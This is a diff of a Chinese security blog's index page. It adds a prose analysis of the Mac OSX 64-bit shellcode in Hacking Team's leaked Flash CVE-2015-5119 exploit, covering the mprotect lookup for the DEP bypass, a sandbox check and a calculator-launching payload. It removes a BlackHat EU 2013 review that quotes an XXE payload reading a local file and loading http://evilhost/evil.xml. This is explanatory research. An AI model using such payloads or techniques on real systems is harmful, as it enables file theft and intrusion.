@@ -77,6 +77,91 @@
     <header>
       
         <div class="icon"></div>
+        <time datetime="2015-07-14T16:00:00.000Z"><a href="/2015/07/15/Hacking-Team-武器库研究（五）：Mac-OSX-64位-Shellcode-技术分析/">2015-07-15</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2015/07/15/Hacking-Team-武器库研究（五）：Mac-OSX-64位-Shellcode-技术分析/">Hacking Team 武器库研究（五）：Mac OSX 64位 Shellcode 技术分析</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>在此次泄露的Flash 0Day的利用代码都包含针对Mac OSX 64位系统的利用，以往在网上看到的大多是Windows平台32/64位的利用代码，很少有Mac版的flash利用代码曝光，刚好可以借机分析学习下军用级武器的写法。</p>
+<p>##【源码分析】</p>
+<p>下面以第1个Hacking Team泄露的CVE-2015-5119 Flash 0day 漏洞中的利用代码为例：</p>
+<p>1、内在中暴力搜索Mach-o文件头magic标记 0xfeedfacf（类似搜索windows平台下的PE头MZ标记），它代表64位程序的意思，也是Mac OS X上可执行文件的开头。</p>
+<p><img src="http://riusksk.me/media/hackteam05/1.png" alt=""></p>
+<p>可以用otool或者MachOView查看Mach-o可执行文件格式：</p>
+<p><img src="http://riusksk.me/media/hackteam05/2.png" alt=""></p>
+<p>2、在Mach-o文件头之后是加载命令（Load Command）区域，接下来程序搜索用于映射文件中的段到进程内存空间的LC_SEGMENT_64加载命令，遍历每个被加载的段，找到包含段标记为S_SYMBOL_STUBS（代表包含符号信息） 和 S_ATTR_PURE_INSTRUCTIONS （代表包含机器码）的段，然后获取段地址Address、偏移量Offset、Size、Stubs Size、Stubs数量以及Indirect Sym Index（间接符号表索引值）。</p>
+<p><img src="http://riusksk.me/media/hackteam05/3.png" alt=""></p>
+<p><img src="http://riusksk.me/media/hackteam05/4.png" alt=""></p>
+<p><img src="http://riusksk.me/media/hackteam05/5.png" alt=""></p>
+<p>3、找到 _LINKEDIT 段，从中获取相应的虚拟地址和文件偏移，然后互减得到两者之间的偏移量。</p>
+<p><img src="http://riusksk.me/media/hackteam05/6.png" alt=""></p>
+<p><img src="http://riusksk.me/media/hackteam05/7.png" alt=""></p>
+<p>4、获取LC_SYMTAB加载命令的相关信息，该命令用于指定文件所使用的符号表，找到后分别获取符号表偏移量、符号数、字符串表偏移量、字符串表大小</p>
+<p><img src="http://riusksk.me/media/hackteam05/8.png" alt=""></p>
+<p><img src="http://riusksk.me/media/hackteam05/9.png" alt=""></p>
+<p>5、获取LC_DYSYMTAB加载命令的相关信息，该命令用于指定动态链接库所使用的符号表，找到后获取间接符号表偏移量</p>
+<p><img src="http://riusksk.me/media/hackteam05/10.png" alt=""></p>
+<p><img src="http://riusksk.me/media/hackteam05/11.png" alt=""></p>
+<p>6、将前面获取的符号表地址、间接符号表地址和字符串表地址分别加上第3步获取的偏移量</p>
+<p><img src="http://riusksk.me/media/hackteam05/12.png" alt=""></p>
+<p>7、从前面获取的3个值，去字符串表中索引mprotect函数，找到其对应的内存地址，以利用它去真正的shellcode部分赋予可执行权限（这部分与Windows平台上的代码基本一致），以绕过DEP的保护。</p>
+<p><img src="http://riusksk.me/media/hackteam05/13.png" alt=""></p>
+<p>8、前面都是为执行接下来x64 shellcode代码而作的准备，由于vfork所创建的子进程与父进程共享数据，因此可用于检测是否位于沙盒中，若在沙盒中vfrok会执行失效，进而退出执行。</p>
+<p><img src="http://riusksk.me/media/hackteam05/14.png" alt=""></p>
+<p>9、通过为syscall指定调用号来调用execve函数，以执行”/Applications/Calulator.app/Contents/MacOS/Calculator”打开计算器，然后再调用exit退出子进程。</p>
+<p><img src="http://riusksk.me/media/hackteam05/15.png" alt=""></p>
+<p>10、设置返回值为int atom类型，左移3位是为了对最后3 bits 清零，因为它代表着atom类型，再加6是为了设置为int atom类型，因为shellcode相当于自定义函数，它是用于替换payload的JIT函数去执行的，最后弹出栈数据，以维持栈平衡。</p>
+<p><img src="http://riusksk.me/media/hackteam05/16.png" alt=""></p>
+<p><img src="http://riusksk.me/media/hackteam05/17.png" alt=""></p>
+<p>##【总结】</p>
+<p>此次的Mac OSX 64位平台的利用，主要还是先根据Maco-o文件头标记找到flash模块，然后去索引符号表、间接符号表和字符串表，进而找到mprotect函数的地址，将shellcode内存块设置为可执行权限。真正用于弹出计算器的shellcode代码相对比较简单，向syscall传递调用号来执行execve函数，进而打开指定的程序文件Calculator，实现最终的任意代码执行。</p>
+<p><img src="http://riusksk.me/media/hackteam05/18.png" alt=""></p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="/2015/07/15/Hacking-Team-武器库研究（五）：Mac-OSX-64位-Shellcode-技术分析/#comment" class="comment-link">评论</a>
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/技术分享/">技术分享</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/Hacking-Team/">Hacking Team</a>, <a href="/tags/OSX/">OSX</a>, <a href="/tags/Shellcode/">Shellcode</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+
+  </div>
+</article>
+
+<!-- 
+
+ -->
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
         <time datetime="2015-07-10T16:00:00.000Z"><a href="/2015/07/11/Hacking-Team-武器库研究（四）：Flash-New-0Day-opaqueBackground-UAF/">2015-07-11</a></time>
       
       
@@ -673,76 +758,6 @@
  -->
 
 
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2013-03-19T16:00:00.000Z"><a href="/2013/03/20/BlackHat-EU-2013/">2013-03-20</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2013/03/20/BlackHat-EU-2013/">关于BlackHat EU 2013大会</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <p>大会文档下载：<a href="https://www.blackhat.com/eu-13/archives.html" target="_blank" rel="external">https://www.blackhat.com/eu-13/archives.html</a></p>
-<p>此次BH EU 议题整体较水，涉及系统安全、移动安全、网络传输安全、WEB安全、游戏安全等。下面随便挑几个议题简单介绍下，有些议题不是很感兴趣，有些也特水，有兴趣的自己到上面链接下载文档。</p>
-<h3 id="1、《A-PERFECT-CRIME-ONLY-TIME-WILL-TELL》"><a href="#1、《A-PERFECT-CRIME-ONLY-TIME-WILL-TELL》" class="headerlink" title="1、《A PERFECT CRIME? ONLY TIME WILL TELL》"></a>1、《A PERFECT CRIME? ONLY TIME WILL TELL》</h3><p>讲述SSL攻击方法——CRIME，如何从SSL加密的会话中获取到cookie，CRIME原理就是通过在受害者的浏览器中运行JavaScript代码并同时监听HTTPS传输数据，进而解密会话Cookie，也算是中间人攻击MIMT的一种方法。该议题对<code>CRIME</code>方法进行扩展，介绍一种叫<code>TIME (Timing Info-leak MadeEasy)</code>的攻击手法，基于传输时间来猜测payload size，然后逐字猜解cookie。</p>
-<h3 id="2、《ADVANCED-HEAP-MANIPULATION-IN-WINDOWS-8》"><a href="#2、《ADVANCED-HEAP-MANIPULATION-IN-WINDOWS-8》" class="headerlink" title="2、《ADVANCED HEAP MANIPULATION IN WINDOWS 8》"></a>2、《ADVANCED HEAP MANIPULATION IN WINDOWS 8》</h3><p>介绍常堆及内核溢出利用技巧，以及在win8上改进后的内存安全保护机制。里面构造堆内存布局的exploit技巧，与以往利用信息泄露获取dll基址来绕过ASLR方法有些类似，都通过分配特定大小的堆块，然后释放出与造成溢出的堆块大小相同的堆块，触发漏洞后覆盖到特定结构。同时，介绍了内核中的堆块分配与释放的原理，然后讲述不同大小的堆块溢出后，如何构造相应的堆布局来实现利用。最后，以windows object内核漏洞为例，讲述win7\win8上的exploit技巧，在wihte paper中已给出相应的exploit代码。</p>
-<h3 id="3、《THE-DEPUTIES-ARE-STILL-CONFUSED》"><a href="#3、《THE-DEPUTIES-ARE-STILL-CONFUSED》" class="headerlink" title="3、《THE DEPUTIES ARE STILL CONFUSED》"></a>3、《THE DEPUTIES ARE STILL CONFUSED》</h3><p>总之，这议题很水，爱看不看。主要讲CSRF和点击劫持<code>clickjacking</code>的攻击技巧，里面也提到前段时间facebook爆出的OAuth2认证漏洞，点击劫持就讲下beef的<code>clickjacking</code>模块，然后提下防御点击劫持的<code>x-frame-options</code>。</p>
-<h3 id="4、《Hacking-Appliances-Ironic-exploits-in-security-products》"><a href="#4、《Hacking-Appliances-Ironic-exploits-in-security-products》" class="headerlink" title="4、《Hacking Appliances: Ironic exploits in security products》"></a>4、《Hacking Appliances: Ironic exploits in security products》</h3><p>初看这标题，还以为是讲客户端软件漏洞利用呢，其实主要还是讲WEB安全的多一些，觉得有点水。</p>
-<h3 id="5、《HACKING-VIDEO-CONFERENCING-SYSTEMS》"><a href="#5、《HACKING-VIDEO-CONFERENCING-SYSTEMS》" class="headerlink" title="5、《HACKING VIDEO CONFERENCING SYSTEMS》"></a>5、《HACKING VIDEO CONFERENCING SYSTEMS》</h3><p>比较有趣的一个议题，主要讲述如何攻击语音会议系统，介绍了root提权以及远程调试的一些技巧，最后演示了一个后门shell。对这些不是很了解，有兴趣的自己看文档。</p>
-<h3 id="6、《Hardening-your-Windows-8-apps-for-the-Windows-Store》"><a href="#6、《Hardening-your-Windows-8-apps-for-the-Windows-Store》" class="headerlink" title="6、《Hardening your Windows 8 apps for the Windows Store》"></a>6、《Hardening your Windows 8 apps for the Windows Store》</h3><p>很水，不解释</p>
-<h3 id="7、《Harnessing-GP²Us-Building-Better-Browser-Based-Botnets》"><a href="#7、《Harnessing-GP²Us-Building-Better-Browser-Based-Botnets》" class="headerlink" title="7、《Harnessing GP²Us Building Better Browser Based Botnets》"></a>7、《Harnessing GP²Us Building Better Browser Based Botnets》</h3><p>觉得这议题有点在玩概念，实际攻击场景或者实战的东西很少，太理论化了。GPU现在很多被用在暴力破解方面，比如跑MD5、跑WPA-PSK，速度比CPU快得N多，比五速鞋还五速鞋……该议题主要讲构造基于浏览器的僵尸网络botnet，利用WEB漏洞（如XSS，并提到利用html5的WEB存储特性、插件等等方法实现永久XSS）来执行代码，再用GPU跑数据，然后利用C&amp;C服务器进行通讯。</p>
-<h3 id="8、《LET’S-PLAY-APPLANTING》"><a href="#8、《LET’S-PLAY-APPLANTING》" class="headerlink" title="8、《LET’S PLAY - APPLANTING》"></a>8、《LET’S PLAY - APPLANTING》</h3><p>很水，为什么这种也能上BH大会讲呢</p>
-<h3 id="9、《MULTIPLAYER-ONLINE-GAMES-INSECURITY》"><a href="#9、《MULTIPLAYER-ONLINE-GAMES-INSECURITY》" class="headerlink" title="9、《MULTIPLAYER ONLINE GAMES INSECURITY》"></a>9、《MULTIPLAYER ONLINE GAMES INSECURITY》</h3><p>讲游戏漏洞相关的，主要涉及协议分析、常见客户端漏洞攻击等，没什么新鲜的东西，爱看不看。</p>
-<h3 id="10、《Next-generation-mobile-rootkits》"><a href="#10、《Next-generation-mobile-rootkits》" class="headerlink" title="10、《Next generation mobile rootkits》"></a>10、《Next generation mobile rootkits》</h3><p>相对比较前沿的东西，主要讲arm平台上的rookit设计，但PPT写得太简洁了，简单一些文本描述，很难完全理解其中意思。之前viaForensics也写一篇关于android rootkit的文档《Dude,where’s my droid?!》，发表于RootedCON 2013安全大会，推荐阅读。</p>
-<h3 id="11、《POWER-ANALYSIS-ATTACKS-FOR-CHEAPSKATES》"><a href="#11、《POWER-ANALYSIS-ATTACKS-FOR-CHEAPSKATES》" class="headerlink" title="11、《POWER ANALYSIS ATTACKS FOR CHEAPSKATES》"></a>11、《POWER ANALYSIS ATTACKS FOR CHEAPSKATES》</h3><p>可能一些搞硬件hacking或者移动安全的朋友会感兴趣，应该属于边信道攻击一类，玩这种都需要花钱买设备，所以搞这些的一般都是高富帅，像kevin2600一样。</p>
-<h3 id="12、《XML-Out-Of-Band-Data-Retrieval》"><a href="#12、《XML-Out-Of-Band-Data-Retrieval》" class="headerlink" title="12、《XML Out-Of-Band Data Retrieval》"></a>12、《XML Out-Of-Band Data Retrieval》</h3><p>这种XML实体注入漏洞，在2011年的时候，80sec就有写过一篇文章提到《XML实体注入漏洞安全警告》<a href="http://www.80sec.com/xml-entity-injection.html，比如可用于读取文件，加载远程页面：" target="_blank" rel="external">http://www.80sec.com/xml-entity-injection.html，比如可用于读取文件，加载远程页面：</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///c:/boot.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://evilhost/evil.xml&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>漏洞实例见《zend framework文件读取漏洞分析》：<a href="http://zone.wooyun.org/content/508" target="_blank" rel="external">http://zone.wooyun.org/content/508</a> ，不过最早是在2002年的时候老外就有提出过这个问题。</p>
-<h3 id="13、《Advanced-iOS-Application-Pentesting》"><a href="#13、《Advanced-iOS-Application-Pentesting》" class="headerlink" title="13、《Advanced iOS Application Pentesting》"></a>13、《Advanced iOS Application Pentesting》</h3><p>看标题冒似很“高级”的样子，实则就介绍下ios的一些逆向工具和ios编程中用到的一些类而已，还是爱看不看。</p>
-<h3 id="14、《APPLICATION-DEVELOPMENT-SECURE-CODING-WORKSHOP》"><a href="#14、《APPLICATION-DEVELOPMENT-SECURE-CODING-WORKSHOP》" class="headerlink" title="14、《APPLICATION DEVELOPMENT SECURE CODING WORKSHOP》"></a>14、《APPLICATION DEVELOPMENT SECURE CODING WORKSHOP》</h3><p>主要讲WEB开发中安全编程，但主要就是在普及WEB安全漏洞的原理、防御等，包括XSS、注入、CSRF等等，算是总结性文章，没有新货，有兴趣的自个翻看下。</p>
-<h3 id="15、《Assessing-BYOD-with-the-Smarthpone-Pentest-Framework》"><a href="#15、《Assessing-BYOD-with-the-Smarthpone-Pentest-Framework》" class="headerlink" title="15、《Assessing BYOD with the Smarthpone Pentest Framework》"></a>15、《Assessing BYOD with the Smarthpone Pentest Framework》</h3><p>作者公布了一款智能机渗透测试框架——Smartphone Pentest Framework v0.1.5，包括一些浏览器漏洞、客户端漏洞、社会工程学漏洞以及本地提权等，利用漏洞获取shell后还可发送短信、获取通信录、短信、下载上传文件等，有些功能还是不错的，但漏洞利用方法相对单一，有其利用的局限性。该工具下载地址：<br><a href="https://github.com/georgiaw/Smartphone-Pentest-Framework" target="_blank" rel="external">https://github.com/georgiaw/Smartphone-Pentest-Framework</a></p>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-          <a href="/2013/03/20/BlackHat-EU-2013/#comment" class="comment-link">评论</a>
-          
-          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
-        </div>
-        
-  
-  <div class="categories">
-    <a href="/categories/技术分享/">技术分享</a>
-  </div>
-
-        
-  
-  <div class="tags">
-    <a href="/tags/BlackHat/">BlackHat</a>
-  </div>
-
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-
-  </div>
-</article>
-
-<!-- 
-
- -->
-
-
 
 <nav id="pagination">
   
@@ -764,6 +779,10 @@
 <div class="widget tag">
   <h3 class="title">最新文章</h3>
   <ul class="entry">
+    
+      <li>
+        <a href="/2020/07/12/信安之路入坑指南/">信安之路入坑指南</a>
+      </li>
     
       <li>
         <a href="/2020/07/12/【书评】聊聊打CTF的那本书/">【书评】聊聊打CTF的那本书</a>
@@ -801,10 +820,6 @@
         <a href="/2020/01/22/Fuzzing技术发展的这30年/">从研究者的视角看Fuzzing技术发展30年</a>
       </li>
     
-      <li>
-        <a href="/2020/01/21/Fuzzing平台建设的研究与设计-paper/">Fuzzing平台建设的研究与设计(paper)</a>
-      </li>
-    
   </ul>
 </div>
 
@@ -816,7 +831,7 @@
   
     <li><a href="/categories/技术分享/">技术分享</a><small>68</small></li>
   
-    <li><a href="/categories/随笔杂谈/">随笔杂谈</a><small>27</small></li>
+    <li><a href="/categories/随笔杂谈/">随笔杂谈</a><small>28</small></li>
   
   </ul>
 </div>
